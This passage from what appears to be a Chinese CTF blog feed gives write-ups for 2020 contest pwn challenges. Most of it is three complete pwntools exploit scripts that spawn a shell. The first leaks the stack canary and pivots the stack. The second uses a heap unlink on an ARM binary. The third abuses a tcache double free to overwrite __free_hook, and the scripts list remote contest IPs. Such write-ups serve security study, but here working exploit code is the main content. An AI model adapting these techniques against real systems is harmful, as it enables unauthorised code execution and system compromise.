class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> sys<span class="token punctuation">,</span>os<span class="token punctuation">,</span>stringelf_path <span class="token operator">=</span> <span class="token string">'./pwn'</span>remote_libc_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>local_libc_x86_path <span class="token operator">=</span> <span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span>local_libc_x64_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>P <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># context.terminal = ['terminator','-x','sh','-c']</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux','split','-h']</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>local <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">'amd64'</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>local_libc_x64_path<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>local_libc_x86_path<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.59.116'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>remote_libc_path<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x11'</span><span class="token operator">*</span><span class="token number">88</span><span class="token operator">+</span><span class="token string">'\x22'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x22'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> canary <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'canary = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400923</span>leave <span class="token operator">=</span> <span class="token number">0x400879</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400923</span>leave <span class="token operator">=</span> <span class="token number">0x400879</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>P<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>P<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400630</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token operator">-</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libcbase = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x22'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">0xaf0</span><span class="token operator">-</span><span class="token number">0x948</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/3.png"></div>这个32位的arm题，保护仅开启NX。<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>典型的菜单题，漏洞也很明显：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/4.png"></div>这里edit的时候有一个控制size的漏洞，那么就可以overflow了。既然这里保护都没开，我们想到一个很久没有使用的技术：unlink<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>unlink向bss中写入bss地址，从而可以控制heap list，写got表地址leak libc，改got表getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>local <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p = process(["qemu-arm", "-g", "1234", "-L", "/usr/624-lib", "./a.out"])</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/624-lib"</span><span class="token punctuation">,</span> <span class="token string">"./a.out"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/624-lib/lib/libc.so.0'</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.58.215'</span><span class="token punctuation">,</span><span class="token number">1337</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/624-lib/lib/libc.so.0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Length:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Length:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Tag:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x2106c</span>  <span class="token comment" spellcheck="true"># 我们想要写入的地址</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ptr<span class="token number">-0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd（0x21060） 写入0x2106c</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2106c</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="of"><a href="#of" class="headerlink" title="of"></a>of</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>给了源码</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/09/2020-di-wu-kong-jian-an-quan-da-sai/5.png"></div><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>double free，填满tcache释放到unsorted bin中残留libc地址，show出来。在利用tcache没有检查double free的问题，利用edit改fd为hook，改hook为system地址，将某个chunk中写入/bin/sh，delete即可getshell</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> sys<span class="token punctuation">,</span>os<span class="token punctuation">,</span>stringelf_path <span class="token operator">=</span> <span class="token string">'./of'</span>remote_libc_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>local_libc_x86_path <span class="token operator">=</span> <span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span>local_libc_x64_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>P <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context.terminal = ['terminator','-x','sh','-c']</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>local <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">'amd64'</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>local_libc_x64_path<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>local_libc_x86_path<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.74.70'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    new<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">-</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    new<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">0x7ff4b7488ca0</span><span class="token operator">-</span><span class="token number">0x7ff4b709d000</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libcbase = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> unlink </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> libc 2.27 double free </tag>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器常见漏洞总结</title>
      <link href="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/"/>
      <url>/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/</url>
      
